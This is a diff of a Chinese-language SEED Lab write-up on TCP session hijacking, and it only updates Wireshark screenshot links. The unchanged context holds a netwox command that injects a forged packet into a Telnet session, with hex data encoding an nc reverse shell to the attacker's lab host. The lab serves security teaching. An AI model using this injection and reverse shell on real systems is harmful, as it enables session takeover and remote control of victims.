@@ -253,9 +253,9 @@ Telnet客户端地址:`192.168.59.144/24`
 
 在wireshark上显示抓包数据如下:
 
-![我们成功的发送了ls !!!](https://raw.githubusercontent.com/isGt93/Keep-learning/master/mySeedLab/TCP-IP/1.png)
+![我们成功的发送了ls !!!](https://raw.githubusercontent.com/isGt93/Keep-learning/master/mySeedLab/TCP-IP/2.png)
 
-![我们成功的获取到了服务器发送的数据 !!!](https://raw.githubusercontent.com/isGt93/Keep-learning/master/mySeedLab/TCP-IP/1.png)
+![我们成功的获取到了服务器发送的数据 !!!](https://raw.githubusercontent.com/isGt93/Keep-learning/master/mySeedLab/TCP-IP/3.png)
 
 
 现在我们来通过NC反弹一个Shell,来控制我们受害者:  
@@ -265,7 +265,7 @@ Telnet客户端地址:`192.168.59.144/24`
 `netwox 40 --ip4-offsetfrag 0 --ip4-ttl 64 --ip4-protocol 6 --ip4-src 192.168.59.146 --ip4-dst 192.168.59.148 --tcp-src 46098 --tcp-dst 23 --tcp-seqnum 1600031421 --tcp-acknum 830921755 --tcp-ack --tcp-psh --tcp-window 128 --tcp-data "6e63203139322e3136382e35392e31203130303130202d63202f62696e2f73680d00"`  
 
 实验结果如图:
-![反弹Shell成功](https://raw.githubusercontent.com/isGt93/Keep-learning/master/mySeedLab/TCP-IP/1.png)
+![反弹Shell成功](https://raw.githubusercontent.com/isGt93/Keep-learning/master/mySeedLab/TCP-IP/4.png)
 
 
 
